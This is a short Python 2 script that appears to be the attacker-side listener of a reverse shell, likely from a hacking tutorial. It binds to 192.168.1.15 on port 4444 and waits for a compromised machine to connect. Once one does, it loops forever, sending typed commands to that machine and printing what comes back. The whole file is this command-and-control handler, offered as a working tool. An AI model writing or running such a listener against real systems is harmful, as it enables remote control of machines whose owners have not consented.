#Libraries
import socket

#Create Socket
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

#Start Socket
listener.bind(("192.168.1.15", 4444))
listener.listen(0)

#Wait for Connection
print("[+] Waiting for incoming connections")
connection, address = listener.accept()
print("[+] Got a connection from " + str(address))

while True:
    command = raw_input(">> ")
    connection.send(command)
    result = connection.recv(1024)
    print(result)
